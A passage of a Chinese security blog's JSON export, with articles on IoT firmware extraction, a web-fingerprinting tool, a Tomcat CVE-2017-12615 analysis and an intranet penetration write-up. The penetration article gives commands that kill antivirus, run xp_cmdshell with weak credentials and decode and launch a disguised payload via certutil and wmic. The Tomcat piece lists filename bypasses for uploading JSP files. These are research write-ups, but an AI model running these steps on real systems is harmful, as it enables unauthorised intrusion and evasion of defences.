打开保存的BIN文件或者查看缓冲区，即可看到固件内容。 在Ubuntu中，用binwalk解包固件，做进一步分析。 案例三：读取某智能摄像头固件打开外壳，在PCB背面发现一颗FLASH存储芯片 通过显微镜发现芯片型号为25L128。 连接编程器读取固件并保存。 案例四：读取某路由器固件打开外壳，发现PCB上有一颗Flash存储器，但厂商出于安全考虑，把芯片印字涂抹掉了。 在不知道芯片型号的情况下，我们连接该芯片，让编程器去尝试读取。 通过智能识别，发现编程器无法识别出具体型号，而因为Flash存储芯片的种类多样，通过查找又无法获得该路由器的具体参数，这时我们通过UART串口，读取出UBOOT启动信息，串口输出里面发现了该芯片型号为W25Q128BV。（下一篇将会重点介绍关于串口调试的方法） 在编程器中选择该型号，成功提取出固件。 用binwalk解包固件。 案例五：读取某智能电饭锅固件拆掉外壳，背面嵌有一块PCB，反面是WIFI处理芯片，正面为存储器，连接编程器。 通过印字分析为25芯片，存储大小为2M字节，尝试该型号芯片，成功读取固件。 案例六：读取某网络监控摄像机固件在PCB上找到一块25L128型号的Flash存储芯片。 通过夹具连接编程器。 识别到芯片为MX25L128，选择其中一种，成功提取固件。 用binwalk解包固件内容。 拆焊芯片读取固件对于某些机器，芯片引脚采用点锡丝网焊接在背面，引脚太小或没有暴露出引脚，就需要通过拆焊芯片来读取固件了。通过热风枪和锡焊配合，很容易从PCB上把芯片拆焊出来，但在拆焊过程中，可能存在芯片因为过热被损坏，PCB上其他元器件被损坏，电路无法接通等风险，需要酌情考虑。 热风枪和锡焊拆焊芯片读取固件设置热风枪温度为400度，拆焊掉的芯片，通过转接座与编程器连接，同样需要注意芯片的引脚方向。 读取芯片固件并导出。","tags":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/tags/硬件安全/"},{"name":"硬件分析","slug":"硬件分析","permalink":"http://www.future-sec.com/tags/硬件分析/"}],"categories":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/categories/硬件安全/"}]},{"title":"浅谈现代化指纹识别及工具编写","date":"2017-11-26T16:00:00.000Z","path":"yet-another-web-fingerprinter.html","text":"前言对于庞大的网络空间来说，存在着各式各样的应用、设备等等资产，而对这些资产进行识别，无论拿来做扫描器还是批量分析，都是非常有价值的，高效的应用指纹识别是一个长久可研究的课题，本文主要探讨如何建立高效可靠的指纹识别方法。 传统的指纹识别一些扫描器里面使用的比较多的都是通过特殊路径 静态文件的md5 值或者大小 关键词等，例如使用比较广泛的一个指纹数据库 。 存在几个问题 效率太低，每一个路径都需要访问一次。容易被waf拦截 目前很多网站的静态资源 cdn于gzip 压缩，md5 其实是不一样的 ，识别率很低 现代化指纹识别怎么来快速的精确的指纹识别，观察了大部分的web系统发现，访问首页并且获取response header 能识别出80% 的app例如WordPress，discuz 会把独特的cookie放到header 里面。discuz 的关键词 _saltkey= 默认首页也会有很多固定的关键词， WordPress wp-conetnt 剩下的指纹再去特殊url提取，这样效率和准确率会提高很多很多。 现代化指纹识别方案指纹库设计数据库结构指纹库类型目前有3种 ，当然后续还需要加上正则。finger 规则是一个 string 之后的python 字典,里面有例如状态吗,规则等字段,例如 weblogic 的指纹规则 1&#123;'port':7001,'url': '/console/login/LoginForm.jsp', 'code': 200, 'grep': 'WebLogic Server'&#125; 下面介绍每一种指纹库实例 指纹规则web_header_contain首页 response 里面的 header 查找特征符速度最快,优先极最高。很多web cms 都会写特殊的cookie 键值。例如 discuz,jboss,wordpress 等。规则编写,以discuz 为例 12345678910111213➜ tools curl -I www.cctry.comHTTP/1.1 200 OKServer: Microsoft-IIS/6.0Connection: keep-aliveDate: Thu, 07 Jan 2016 18:22:34 GMTContent-Type: text/html; charset=gbkContent-Length: 0X-Powered-By: PHP/5.2.17Set-Cookie: Vguy_2132_saltkey=O6srsEYk; expires=Sat, 06-Feb-2016 18:22:22 GMT; path=/; httponlySet-Cookie: Vguy_2132_lastvisit=1452187342; expires=Sat, 06-Feb-2016 18:22:22 GMT; path=/Set-Cookie: Vguy_2132_sid=MwE6e0; expires=Fri, 08-Jan-2016 18:22:22 GMT; path=/Set-Cookie: Vguy_2132_lastact=1452190942%09index.php%09; expires=Fri, 08-Jan-2016 18:22:22 GMT; path=/X-Daa-Tunnel: hop_count=1 经过分析,字符串 _saltkey= 为discuz header 中的规则具体规则如下 web_index_contain在缓存的首页里面查找关键词或者正则匹配优先级次之,只需要 get请求一次即可。例如Office Anywhere 指纹 编写流程数据包分析 12345➜ tools curl http://125.91.218.186:8000/ | grep '/images/tongda.ico' % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 2001 100 2001 0 0 11795 0 --:--:-- --:--:-- --:--:-- 11840&lt;link rel=\"shortcut icon\" href=\"/images/tongda.ico\"&gt; 规则编写 web_url_contain特殊url 查找指定的关键词(返回状态码也指定)。优先级最低。例如 weblogic 的指纹 finger 过程数据包分析 12345678910➜ tools curl -I http://202.97.194.9:7001/console/login/LoginForm.jspHTTP/1.1 200 OKCache-Control: no-cacheDate: Thu, 07 Jan 2016 18:53:28 GMTPragma: no-cacheContent-Type: text/html; charset=UTF-8Expires: Thu, 01 Jan 1970 00:00:00 GMTSet-Cookie: ADMINCONSOLESESSION=XQXrWT0LQTvpf8Jv75nMnQB9vN0cGppy7bTfJxfH9S673VTGP1Wl!1715621632; path=/Content-Language: zh-CNX-Powered-By: Servlet/2.5 JSP/2.1 规则 1&#123;'url': '/console/login/LoginForm.jsp', 'code': 200, 'grep': 'WebLogic Server'&#125; 表 程序编写指纹识别模块代码 12345678910111213141516171819202122232425262728293031323334353637383940414243# coding:utf-8\"\"\" *@Projet Yafinger *@Author yaseng@uauc.net *@Desc playweb finger modules\"\"\"import ast,timeimport configfrom lib import utildef get_web_app(url): rsp_index = util.http_get(url) str_index = \"\" if rsp_index == None : return None list_app=[] fingers=config.get('fingers'); for finger in fingers : rule = ast.literal_eval(finger['finger']) if finger['type'] == 'web_index_contain': # limit header and body and code exp : &#123;'header':'jsessionid=','code': 200, 'grep': '.action'&#125; if rule.has_key('header') and rule['header'] not in str(rsp_index['headers']).lower() : continue if rsp_index['code'] == rule['code'] and rule['grep'] in rsp_index['data'] : list_app.append(&#123;'app_id':finger['id'], 'url':url&#125;) util.log(\"url:%s app:%s\" % (url, finger['app_name'])) elif finger['type'] == 'web_url_contain' : rsp_tmp = util.http_get(url + rule['url']) if rsp_tmp == None : continue if rsp_tmp['code'] == rule['code'] and rule['grep'] in rsp_tmp['data'] : list_app.append(&#123;'app_id':finger['id'], 'url':url&#125;) util.log(\"url:%s app:%s\" % (url + rule['url'], finger['app_name'])) elif finger['type'] == 'web_header_contain' : if rule['grep'] in str(rsp_index['headers']).lower() : list_app.append(&#123;'app_id':finger['id'], 'url':url&#125;) util.log(\"url:%s app:%s\" % (url , finger['app_name'])) time.sleep(0.01) return list_app 单独识别简单调用指纹识别模块代码 12345678910111213141516171819202122232425262728293031323334353637383940# coding:utf-8\"\"\" *@Projet Yafinger *@Author yaseng@uauc.net *@Desc yafinger test __ __ ___ /\\ \\ /\\ \\ /'___\\ __ \\ `\\`\\\\/'/ __ /\\ \\__/ /\\_\\ ___ __ __ _ __ `\\ `\\ /' /'__`\\ \\ \\ ,__\\\\/\\ \\ /' _ `\\ /'_ `\\ /'__`\\/\\`'__\\ `\\ \\ \\ /\\ \\L\\.\\_\\ \\ \\_/ \\ \\ \\ /\\ \\/\\ \\ /\\ \\L\\ \\ /\\ __/\\ \\ \\/ \\ \\_\\\\ \\__/.\\_\\\\ \\_\\ \\ \\_\\\\ \\_\\ \\_\\\\ \\____ \\\\ \\____\\\\ \\_\\ \\/_/ \\/__/\\/_/ \\/_/ \\/_/ \\/_/\\/_/ \\/___L\\ \\\\/____/ \\/_/ /\\____/ \\_/__/ \"\"\"import os, time, sys, Queue, threading, astimport configfrom lib import utilfrom lib.db import *from optparse import OptionParserfrom modules import fingerif __name__ == \"__main__\": usage= '''%prog --host host --port port --finger &lt;all|app_name&gt; \\r\\nExample:%prog --url http://127.0.0.1 --finger phpmyadmin ''' parser = OptionParser(usage=usage) parser.add_option(\"-u\", \"--url\", dest=\"url\", help=\"target url\") parser.add_option(\"-f\", \"--finger\", dest=\"finger\", help=\"finger_db app_name,default all \", default=\"all\") options, arguments = parser.parse_args() if options.url == None : parser.print_help() exit(0) db = MySQL(config.db_config) sql_finger_where=' ' if options.finger == 'all' else \" and app_name='%s' \" % options.finger db.query(\"SELECT * from pw_finger_db where `enable`=1 %s \" % sql_finger_where) fingers = db.fetch_all() if len(fingers) == 0 : util.log('finger app_name %s not found' % options.finger ,3,'finger') config.set(\"fingers\",fingers) util.log(\"load fingers count %d\" % len(fingers),1,'finger') finger.get_web_app(options.url) 批量识别 可以使用线程池来实现批量指纹识别。 指纹结果融合到系统中指纹保存在数据库中，本模块可以快速整合到扫描器或者其他项目中。 yafingeryet another web fingerprinterhttps://github.com/yaseng/yafinger issue 指纹库需要补充 可以不局限于web指纹 某些情况可能目前的指纹规则不符合，还需要添加新的指纹规则，例如正则","tags":[{"name":"指纹识别","slug":"指纹识别","permalink":"http://www.future-sec.com/tags/指纹识别/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://www.future-sec.com/categories/web安全/"}]},{"title":"记一次曲折的内网渗透","date":"2017-11-19T16:00:00.000Z","path":"network-penetration.html","text":"环境 网络：内网C1和C2处于同一网段，可以互通，仅DNS可以访问外网。 安全防护：360全家桶、安全狗、云锁定制版、金山卫士 其他相关信息如下表： 基本情况C1是通weblogic反序列化拿下的，具体怎么获取的webshell就不细说了，根据C1的配置、文件、主机名和数据库等信息可以知道，目标网站之前是存放再C1的，因为上面的源码和数据库基本上和C2的一致。通过weblogic的配置文件可以知道C2的真实IP，主机上面存在各种安全防护软件，各种全家桶，很多命令、脚本和exe都无法运行，比如带有net的命令都无法运行，net、netstat、sc、wscript等 思路目标：获取C2的管理权限，包括网站内容管理和替换等，非单纯的系统权限。1、通过C1利用http隧道或DNS隧道进行socks代理，对C2进行进一步渗透2、抓取C1管理员口令或直接利用当前用户的token进行攻击3、利用数据库或中间件弱口令进行攻击4、利用web漏洞进行攻击，如注入、上传和命令执行等漏洞5、中间人攻击或者嗅探等，但是影响太大，也需等比较久的时间 过河搭桥由于是weblogic，无法直接使用http隧道类的代理，因为环境仅支持jspx，没有找到可以用的代理webshell，故采取第二种方案，即通过DNS进行控制和代理。这里我首先想到的自然是cobalt strike的DNS Beacon。 cobalt strike dns beacon 环境构建参考：官方手册 或自行google 获取beacon由于存在360全家桶等，所以得先把他们干掉：1234taskkill /im 360* /t /ftaskkill /im ZhuDongFangYu.exe /t /ftaskkill /im KSafeSvc.exe /t /fps:云锁是定制版，这里就不写进程名称了，也不影响远控的执行，安全无法结束也不影响 由于无法上传exe，所以将生成exe重命名为jspx上传，执行之后，等待几分钟，既可以成功上线，这里有个坑，因为内网配置的DNS可能是一些不知名的或者是114之类的，会影响上线，所以这里建议使用8.8.8.8或者119.29.29.29，因为我用的是DNSPOD，修改DNS:1netsh interface ip set dns \"本地连接\" source=static addr=119.29.29.29 开启代理 参考官方手册 linux可以用Proxychains，windows可以使用Proxifier PE或SocksCap64 内网漫游 通过jsp大马自带的端口扫描发现C2开放的端口有： 80：WMC生成的html，没啥可搞的 1433：因为C1的mysql账号密码是root/root，因此猜测存在弱口令 8080、8001、8081：就apache的一个代理，没有什么页面和功能 利用socks代理通过1433连接器，sa/sa获取了mssql的DBA权限，暗自高兴了一会，以为道这里就快搞定了，因为系统存在多个web服务，很自然的可以想到，直接可以通过mssql的xp_cmdshell，echo一个一句话就可以搞定了，然而这只是开始。 山重水复疑无路iis环境，可以写一句话，但是所有目录的脚本权限都被禁止，所以这条路也断了123456简单提一下，iis找网站路径的方法1. dir/s /b f:\\123.jpg (磁盘文件太多时无法使用)2. 查看配置文件：iis6:type %systemroot%\\system32\\inetsrv\\metabase.xml|findstr Path=iis7/8:type %systemroot%\\System32\\inetsrv\\config\\applicationHost.config|findstr physicalPath=iis7/8: appcmd list sites apache环境并没有装php，无法执行php脚本12wmic process where name=\"httpd.exe\" get processid,executablepath,name其他中间件或web服务的也可以根据运行程序的路径，查看其配置文件，使用wmic命令查看运行路径: 上远控，远控怎么上传上去呢？于是找到这篇文章《15种文件下载的方式》 再win2k3上面能用的，就剩下ftp、vbs、Bitsadmin、smb、c#、hex vbs和smb都被安全狗限制无法利用 c#编译成功了，但是无法下载，貌似也被限制了 bitsadmin不存在此命令 FTP批量处理下载，C1上面有一个FTP，也是无法成功下载 hex太长转换麻烦，暂时不考虑 刚刚最近国外有大神提到了certutil命令，本地测试了一下，下载的文件无法指定路径，也不能正常保存，故又放弃了此路，详情可以参考这篇文章，win2k3保存有问题 柳暗花明又一村 经过尝试各种下载姿势，还是无法下载，想了很久，又回到了certutil，因为他是系统自带的命令，从win2k3道windows 2016都是存在的，既可以用于下载，也可以用于base64编码和文件hash校验。故此：通过certutil将生成的exe转换为base64编码，利用echo命令写入到文本12345678910111213141516171. 文件hash(1) SHA1certutil.exe -hashfile msg.dll(2) SHA256：certutil.exe -hashfile msg.dll SHA256(3) MD5：certutil.exe -hashfile msg.dll MD52.编码(1) base64编码：CertUtil -encode InFile OutFile(2) base64解码CertUtil -decode InFile OutFile注：编码后的文件会添加两处标识信息，不影响文件解码文件头：-----BEGIN CERTIFICATE-----文件尾：-----END CERTIFICATE----- mssql查询分析器批量echo文本保存1exec master..xp_cmdshell \"echo xxxx &gt;&gt; C:\\temp\\test.txt\" 使用certutil还原exe可以还原为txt，因为exe无法写入，并使用其校验文件hash结束相关杀软进程和服务，这里提一点，因为C2的360是自动启动的，所以需要禁用自启，由于sc无法使用，我们可以使用wmic替代：1234exec master..xp_cmdshell \"taskkill /im 360* /t /f\"taskkill /im ZhuDongFangYu.exe /t /fexec master..xp_cmdshell \"wmic Service where name='360EntClientSvc' call stopservice\"exec master..xp_cmdshell \"wmic Service where name='360rp' call stopservice\" 最后运行解码的exe即可12CertUtil -decode test.txt xshell.txtwmic process call create 'c:\\temp\\xshell.txt' 总结 本次渗透，可以说是一波三折，主要学习到的东西是在复杂环境下，综合利用各种windows自带的工具进行绕过安全防护，如wmic、taskkill、certutil等综合运用，才得以绕过杀软的防御，也存在一定运气的成分如数据库弱口令、病毒库更新不及时等。 从防御的角度来看的话：1、加强日常安全运维的巡检，其实我的exe上传不止一次被杀或这被拦截，如果巡检自然可以发现2、提高安全运维人员意识，做好安全策略管理，如数据库弱口令这些本不该有的3、及时更新防病毒软件和恶意代码库，新版的360没法结束4、加强对外恶意流量的安全检测，如DNS、http等","tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://www.future-sec.com/tags/内网渗透/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://www.future-sec.com/categories/web安全/"}]},{"title":"Tomcat 远程代码执行漏洞分析（CVE-2017-12615）","date":"2017-11-19T16:00:00.000Z","path":"tomcat-code-execution.html","text":"复现环境环境是Windows 7 64位 Apache Tomcat 7.0.70 复现过程根据描述，在 Windows 服务器下，将 readonly 参数设置为 false 时，即可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码。通过阅读 conf/web.xml 文件，可以发现：修改 Tomcat 7.0/conf/web.xml 文件。添加 readonly 属性，设置为false。重启tomcat启动 Tomcat，利用 PUT 请求创建文件：提示 404。通过所描述的 Windows 受影响，可以结合 Windows 的特性。一是 NTFS 文件流，二是文件名的相关限制（比如 Windows 中文件名不能以空格结尾）来绕过限制：访问发现可以正常输出： 原理分析本次的tomcat漏洞涉及到DefaultServlet和 JspServlet。Tomcat的Servlet 是在 conf/web.xml 配置的，通过配置文件可知，当后缀名为 .jsp 和 .jspx 的时候，是通过JspServlet处理请求的，下面的默认的配置情况：而其他的静态文件时通过DefaultServlet处理的，同时DefaultServlet 可以处理 PUT 或 DELETE请求：也就是说，除了jsp和jspx默认是由org.apache.jasper.servlet.JspServlet处理，其他默认都是由org.apache.catalina.servlets.DefaultServlet来处理。从而的得知，即是设置readonly为false，tomcat在默认情况下也不允许PUT上传jsp和jspx文件，因为后端都用org.apache.jasper.servlet.JspServlet来处理jsp或是jspx后缀的请求了，而JspServlet中没有PUT上传的相关操作，PUT的代码实现只存在于DefaultServlet中。这个漏洞的根本是通过构造特殊后缀名，绕过了tomcat检测，让它用DefaultServlet的逻辑去处理请求，从而上传jsp文件。目前主要三种方法：123test.jsp%20test.jsp::$DATAtest.jsp/ (bypass) 可以得知，“test.jsp ”（末尾有一个和空格即“test.jsp%20”）和“test.jsp::$DATA”并不能匹配到 JspServlet，而是会交由DefaultServlet去处理。当处理 PUT 请求时：主要是doPut，这里tomcat开始处理PUT请求，可以看到这里如果readonly是true就直接进入error了，所以在前面的步骤中需要设置成false。会调用resources.bind：而继续调用dirContext.bind真正写入文件在FileDirContext.java的rebind函数里又由于 Windows 不允许“ ”（此处为一个空格）作为文件名结尾，所以会创建一个 .jsp 文件，导致代码执行。FileOutputStream特性到这里是否会想，当请求jsp%20或是jsp::$DATA后缀的时候，为什么最终却写入.jsp后缀的文件?这些其实是java.io. FileOutputStream的问题了，需要进一步分析jdk的C代码才能得到解答，如图跟进去FileOutputStream跟进去open跟到open是native的，不是java层面的问题了，这里open实际上是一个jni接口，然后调用windows API CreateFileW创建文件，这里下载openjdk6的jdk代码进行分析，如图:FileOutputStream_md.c这里Java_java_io_FileOutputStream_open便是上面java代码里open函数的C代码实现，其中参数path对应open函数的name变量，继续跟踪，如图:io_util_md.c继续跟进去winFileHandleOpen，这里最终调用windows的CreateFileW实现文件创建，如图：io_util_md.c而在windows下，创建文件是对后缀名称进行处理的，例如：如果后缀末尾是空格，会被去掉，a.txt::$DATA传入CreateFileW也会被处理成a.txt Bypass 分析然而，当 PUT 地址为/test.jsp/时，仍然会创建 JSP，会影响 Linux 和 Windows 服务器，并且 Bypass 了之前的补丁，分析如下。在进入 bind 函数时，会声明一个 File 变量：进入 File 后，会对 name 进行 normalize (在file.class)继续跟入在这里这个normalize(path, n, (prev == slash) ? i - 1 : i)会将文件名末尾的/过滤掉，所以可以导致后面文件写入jsp文件。 影响由于存在去掉最后的 / 的特性，那么这个漏洞自然影响 Linux 以及 Windows 版本。而且经过测试，这个漏洞影响全部的 Tomcat 版本，从 5.x 到 9.x 都会受到影响。目前来说，最好的解决方式是将 conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 true，（默认设置是false）。","tags":[{"name":"Tomcat","slug":"Tomcat","permalink":"http://www.future-sec.com/tags/Tomcat/"},{"name":"远程代码执行","slug":"远程代码执行","permalink":"http://www.future-sec.com/tags/远程代码执行/"}],"categories":[{"name":"系统安全","slug":"系统安全","permalink":"http://www.future-sec.com/categories/系统安全/"}]},{"title":"物联网硬件安全分析基础-硬件分析初探","date":"2017-11-16T16:00:00.000Z","path":"iot-security-hardware-analysis.html","text":"前言当我们在分析IOT设备，如智能摄像头、智能门锁、智能路由器等等产品时，采用传统的安全检测手段，如对APP的逆向、云端服务器的渗透测试、产品通信的抓包等方式可以获得部分的信息，但如果需要深入分析智能设备底层的工作原理，从中发现更深层次的安全问题，就不可避免的需要直接接触硬件本身，这也是传统安全手段未能触及的部分，据此，下面简单的谈下关于电路分析和芯片固件提取和调试的一点心得。 电路识别在对电路进行分析之前，需要对PCB电路图和电子元器件知识有简单的了解。PCB（ Printed Circuit Board），中文名称为印制电路板，又称印刷线路板，是重要的电子部件，是电子元器件的支撑体，是电子元器件电气连接的载体。由于它是采用电子印刷术制作的，故被称为“印刷”电路板。 电子元器件电子元件有着不同的封装类型，不同类的元件外形一样，但内部结构及用途是大不一样的，比如TO220封装的元件可能是三极管、可控硅、场效应管、或双二极管。TO-3封装的元件有三极管，集成电路等。二极管也有几种封装，玻璃封装、塑料封装及螺栓封装，二极管品种有稳压二极管、整流二极管、隧道二极管、快恢复二极管、微波二极管、肖特基二极管等，这些二极管都用一种或几种封装。贴片元件由于元件微小有的干脆不印字常用尺寸大多也就几种，所以没有经验的人很难区分，但贴片二极管及有极性贴片电容与其它贴片则很容易区分，有极性贴片元件有一个共同的特点，就是极性标志。对于元件识别可以看印字型号来区别，对于元件上没有字符的器件也可分析电路原理或用万用表测量元件参数进行判断。判断元件类型并非一朝一夕就能学会的，这需要多年积累的经验来认识。 ROM芯片在对PCB和电子元器件有一定认知后，就可以开始分析其工作原理和芯片了，常见的IOT产品，一般采用嵌入式linux系统开发，对芯片分析主要目的之一就是获取到硬件系统的固件，从固件中分析可能存在的安全风险。固件一般存储在ROM中，ROM是只读存储器（Read-Only Memory）的简称，是一种只能读出事先所存数据的固态半导体存储器。其特性是一旦储存资料就无法再将之改变或删除。通常用在不需经常变更资料的电子或电脑系统中，并且资料不会因为电源关闭而消失。常见的存储芯片按照存储读取方式和制作工艺不同，可以分为： ROM、PROM、EPROM、EEPROM、FLASH-ROM。在大部分IOT产品中多采用flash芯片作为存储器，提取固件主要也是通过读取flash芯片。 Flash芯片FLASH ROM属于真正的单电压芯片，在使用上很类似EEPROM，因此，有些书籍上便把FLASH ROM作为EEPROM的一种。事实上，二者还是有差别的。FLASH ROM在擦除时，也要执行专用的刷新程序，但是在删除资料时，并非以Byte为基本单位，而是以Sector（又称Block）为最小单位，Sector 的大小随厂商的不同而有所不同；只有在写入时，才以Byte为最小单位写入；FLASH ROM芯片的读和写操作都是在单电压下进行，不需跳线，只利用专用程序即可方便地修改其内容；FLASH ROM的存储容量普遍大于EEPROM，约为512K到至8M KBit，由于大批量生产，价格也比较合适，很适合用来存放程序码，近年来已逐渐取代了EEPROM，广泛用于主板的BIOS ROM，也是CIH攻击的主要目标。 根据技术方式不同可分为： IIC EEPROM、SPI NorFlash 、CFI Flash、Parallel NandFlash、SPI NandFlash、eMMC Flash、USF2.0等。 其中SPI NorFlash因为接口简单，使用的引脚少，易于连接，操作方便，并且可以在芯片上直接运行代码，其稳定性出色，传输速率高，在小容量时具有很高的性价比，这使其很适合应于嵌入式系统中作为 FLASH ROM，所以在市场的占用率非常高。 我们通常见到的S25FL128、MX25L1605、W25Q64等型号都是SPI NorFlash，其常见的封装多为SOP8，SOP16，WSON8，US0N8，QFN8、BGA24等。 芯片印字一般PCB上有多块逻辑处理IC，在多个IC芯片中，可以通过分析电路原理和查找芯片印字来确定具体的存储芯片。 芯片上的丝印大多数情况会注明厂商和芯片型号，通过印字可以初步确定芯片类型，同时丝印层的文字也可以帮助我们来确定存储的格式和大小，常见的W25芯片的印字含义如下： 编程器读取Flash芯片，需要借助编程器，编程器又称烧录器、写入器、写码器，是专门用来对IC芯片进行读写、编程/烧录的仪器。并口多功能BIOS编程器，它可以对EPROM（27系列芯片）、EEPROM（28系列芯片）、FLASH ROM（29、39、49系列芯片）及单片机、串行芯片等进行读写、编程，是一种性价比较高的编程器。编程器种类多样，从功能简单的专用型到功能全面的全功能通用型都有，价格从几十元到上万元不等。 串口通信串口通信指串口按位（bit）发送和接收字节。尽管比按字节（byte）的并行通信慢，但是串口可以在使用一根线发送数据的同时用另一根线接收数据。在串口通信中，常用的协议包括RS-232、RS-422和RS-485。 RS-232通信方式允许简单连接三线：Tx、Rx和地线。但是对于数据传输，双方必须对数据定时采用使用相同的波特率。 RS-422标准全称是“平衡电压数字接口电路的电气特性”，在RS232后推出，使用TTL差动电平表示逻辑，就是两根的电压差表示逻辑，RS422定义为全双工的，所以最少要4根通信线（一般额外地多一根地线）。 RS485是一个定义平衡数字多点系统中的驱动器和接收器的电气特性的标准，RS-485与RS-422的区别在于RS-485为半双工通信方式，RS-422为全双工方式。RS-422用两对平衡差分信号线分别用于发送和接收，所以采用RS-422接口通信时最少需要4根线。RS-485只用一对平衡差分信号线，不能同时发送和接收，最少只需两根连线。 UART调试通用异步收发传输器（Universal Asynchronous Receiver/Transmitter)，通常称作UART，是一种异步收发传输器，是电脑硬件的一部分。它将要传输的资料在串行通信与并行通信之间加以转换。作为把并行输入信号转成串行输出信号的芯片，UART通常被集成于其他通讯接口的连结上。对于物联网硬件的串口调试，多数情况下指的就是通过UART串口进行数据通讯， 但是我们经常搞不清楚它和COM口的区别, 以及RS232, TTL等关系, 实际上UART、COM指的物理接口形式(硬件), 而TTL、RS-232是指的电平标准(电信号).UART有4个pin（VCC, GND, RX, TX）, 用的TTL电平， 低电平为0(0V)、高电平为1（3.3V或以上），Uart串口的RXD、TXD等一般直接与处理器芯片的引脚相连，而RS232串口的RXD、TXD等一般需要经过电平转换(通常由Max232等芯片进行电平转换)才能接到处理器芯片的引脚上，否则这么高的电压很可能会把芯片烧坏。在调试的时候, 多数情况下我们只引出rx、tx、gnd即可，但是UART的数据要传到电脑上分析就要匹配电脑的接口，通常我们电脑使用接口有COM口和USB口（最终在电脑上是一个虚拟的COM口），但是要想连上这两种接口都要需要进行硬件接口转换和电平转换。 设备拆解对于一台未接触过的机器，拆解首先需要观察其外部结构，是否存在暴露的螺丝孔，如果没有，一般可能隐藏在贴纸或橡胶垫下面，可以用手感受是否存在空洞，部分机器采用卡榫结构，只要找对方向，用一字螺丝刀或撬片，从缝隙中就可以撬开，拆解设备唯一的要诀就是胆大心细。部分常用工具如下：维修组合套装，用来拆装各类螺丝，PCB夹用来拔出排线，手电筒用来观察芯片印字和PCB走线，PCB测试夹用来夹住某些难以焊接的焊点，排线用来连接各类电子设备，热风枪和焊枪用来拆焊和锡焊。 常见物联网智能设备共享充电宝，采用gprs模块配合物联卡与云端通信 蓝牙挂锁，通过蓝牙芯片与手机配对通信，蓝牙控制电机驱动，使卡锁运转 共享充电宝，采用GSM模块加蓝牙模块控制通信 智能锁，WIFI芯片加蓝牙芯片配合控制，外接指纹识别传感器 智能摄像头，采用WIFI芯片通信，外接音频、视频处理模块 网络摄像机，采用网卡芯片，配合多口输出输入视频信号模块 智能路由器，高容量内存搭配智能OS 智能家居控制终端，高性能WIFI收发中继控制 智能保险柜，采用WIFI芯片控制加指纹识别传感器 无线终端，采用4G模块和WIFI芯片，做便携式WIFI终端 读取芯片为了读取Flash芯片的内容，有以下三个基本途径：（1）直接将导线连接到芯片的引脚，在通过导线连接编程器读取固件；（2）把芯片拆下来，在连接编程器读取固件。（3）连接TXD、RXD调试PIN，通过UART串口转接读取固件。根据Flash芯片的封装方式和电路设计不同，需要灵活采用不同的方式。 参考文献 http://www.china-cic.cn/ 中国通信协会相关文献 https://www.eia.gov/ 美国电子工业协会相关标准","tags":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/tags/硬件安全/"},{"name":"硬件分析","slug":"硬件分析","permalink":"http://www.future-sec.com/tags/硬件分析/"}],"categories":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/categories/硬件安全/"}]},{"title":"BROADCOM WI-FI芯片漏洞分析一","date":"2017-08-29T16:00:00.000Z","path":"broadcom-wifi-1.html","text":"前言Android Wi-Fi驱动一直是众多安全研究员关注的重点，Android Wi-Fi驱动中曾经被发现大量root提权漏洞。 但这些漏洞都是存在于WEXT(Wireless-Extensions)接口中的，WEXT是一种即将被淘汰的Wi-Fi配置接口。取而代之的是基于nl80211协议的cfg80211接口。本篇文章主要介绍了基于nl80211协议的cfg80211怎么触发Wi-Fi芯片中的漏洞。以及相关漏洞的定位和分析。 为什么研究Wi-Fi？Wi-Fi的使用已经与生活密不可分，Wi-Fi安全问题也应该受到更大的重视。在最近的一次移动安全峰会上，有一个议题是关于Wi-Fi芯片漏洞远程代码执行的。借此，重点研究了一下Wi-Fi芯片漏洞。 读懂Poc需要哪些前提知识JNIpoc 是jni语言编写的，那什么是jni呢? JNI全称为java native interface,Java本地开发接口,JNI是一个协议,这个协议可以用来沟通Java代码和本地的c/c++代码 让两者可以相互的调用在poc的文件结构中我们可以看到一个jni文件都包含下面三个文件：• Android.mk文件是在使用NDK编译C代码时必须的文件。Android.mk文件中描述了哪些C文件将被编译且指明了如何编译。• Application.mk目的是描述在你的应用程序中所需要的模块(即静态库或动态库)。• Pwn.c是触发漏洞的测试代码。 Netlink Protocol Library Suite （libnl）主要用来套接字的处理、发送和接收数据、消息的构造和解析。 NetlinkNetlink协议是基于套接字的进程间通信（IPC）机制，它可用于用户空间进程和内核之间或者用户空间进程之间的通信。Netlink 协议基于 BSD 套接字并使用 AF_NETLINK 地址簇。每一个 Netlink协议都有自己的协议号（比如：NETLINK_ROUTE，NETLINK_NETFILTER，等等）。它的寻址方案是基于 32 位的端口号（之前被称为 PID），这个端口号用来唯一的标识每一个对等通信节点。-nl_send_auto_complete()消息和数据的发送函数poc中主要使用nl_send_auto_complete函数来发送数据，这个是libnl封装好的。最终还是调用nl_send_auto() 函数来发送数据。参考一个翻译的官方文档：http://blog.guorongfei.com/2015/01/27/libnl-translation-part4/-nla_put()数据封装函数nla_put() 函数以 nla_reserve()函数为基础，只不过它还接收一个指向包含属性载荷的缓冲区的指针。这个函数会自动把数据从缓冲区拷贝到消息中去。会利用嵌套属性进行数据包封装，属性的嵌套是通过在代码前后分别调用nla_nest_start() 和 nla_nest_end() 来完成的。nla_nest_start() 函数会在消息中添加一个没有实际载荷的属性头部，在此之后添加的数据都会成为容器属性的载荷部分直到调用 nla_nest_end()为止，它的调用“关闭”了容器属性并校正它的载荷长度以包含所有的数据长度。 cfg80211/nl80211nl80211是供用户空间进程使用，操作利用cfg80211 API 开发无线网卡驱动。cfg80211是开发驱动的接口。 TDLS 协议TDLS旨在提供一种不依赖AP的Wi-Fi网络上的对等通信方式。 TDLS是基于IEEE 802.11z标准。TDLS自动链接配置主要通过几个过程来完成• TDLS Discovery过程TDLS Discovery过程不是必要选项。一个TDLS STA设备可以选择直接发起TDLS建立过程。 TDLS Discovery 过程由一部STA设备通过AP或Go(群组拥有者) 向另外一部STA设备发送一个TDLS Discovery请求帧开始。如果目标设备也兼容TDLS，它将直接向该发送设备回复TDLS Discovery 